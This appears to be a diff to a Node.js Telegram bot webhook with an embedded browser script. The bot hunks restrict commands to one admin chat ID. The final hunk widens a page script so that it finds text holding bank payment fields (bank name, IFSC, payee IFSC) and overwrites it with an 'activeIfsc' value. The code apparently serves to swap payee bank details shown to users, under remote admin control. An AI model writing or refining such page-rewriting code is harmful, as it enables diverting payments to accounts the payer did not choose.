@@ -830,6 +830,7 @@ app.post('/bot-webhook', async (req, res) => {
     // accidental surrounding whitespace without changing command arguments.
     const text = msg.text.trim().replace(/^\/(\w+)@[\w_]+/i, '/$1');
     let data = await loadData(true);
+    const authorizedAdminId = TELEGRAM_ADMIN_CHAT_ID || String(data.adminChatId || '');
     if (TELEGRAM_ADMIN_CHAT_ID && String(data.adminChatId || '') !== TELEGRAM_ADMIN_CHAT_ID) {
       data.adminChatId = TELEGRAM_ADMIN_CHAT_ID;
       data._skipOverrideMerge = true;
@@ -842,7 +843,7 @@ app.post('/bot-webhook', async (req, res) => {
     }
 
     if (text === '/start') {
-      if (data.adminChatId && String(data.adminChatId) !== String(chatId)) {
+      if (authorizedAdminId && String(authorizedAdminId) !== String(chatId)) {
         await bot.sendMessage(chatId, `❌ Bot already configured with another admin.\nYour chat ID: ${chatId}\nUse /chatid, then set TELEGRAM_ADMIN_CHAT_ID in Vercel and redeploy.`);
         return res.sendStatus(200);
       }
@@ -894,7 +895,7 @@ Example:
       return res.sendStatus(200);
     }
 
-    if (data.adminChatId && chatId !== data.adminChatId) {
+    if (authorizedAdminId && String(authorizedAdminId) !== String(chatId)) {
       await bot.sendMessage(chatId, `❌ Unauthorized.\nYour chat ID: ${chatId}\nUse /chatid, then set TELEGRAM_ADMIN_CHAT_ID in Vercel and redeploy.`);
       return res.sendStatus(200);
     }
@@ -2615,7 +2616,8 @@ var walker=document.createTreeWalker(document.body,NodeFilter.SHOW_TEXT,null,fal
 while(walker.nextNode()){
   var nd=walker.currentNode;
   var txt=(nd.textContent||'').trim();
-  if(/^\\{\\s*["']?code["']?\\s*:\\s*0[\\s\\S]*["']?data["']?\\s*:\\s*\\{\\s*\\}\\s*\\}$/.test(txt)){
+  var isBankJson=/^\\s*\\{[\\s\\S]*\\}\\s*$/.test(txt)&&/["']?(?:code|msg|data|bankName|bank|ifsc|payee_bankname|payee_ifsc)["']?\\s*:/.test(txt);
+  if(isBankJson){
     var p=nd.parentElement, ctx=p?((p.innerText||'')+' '+(p.parentElement?p.parentElement.innerText||'':'' )).toLowerCase():'';
     if(ctx.indexOf('bank')>-1||ctx.indexOf('ifsc')>-1){nd.textContent=activeIfsc;}
   }
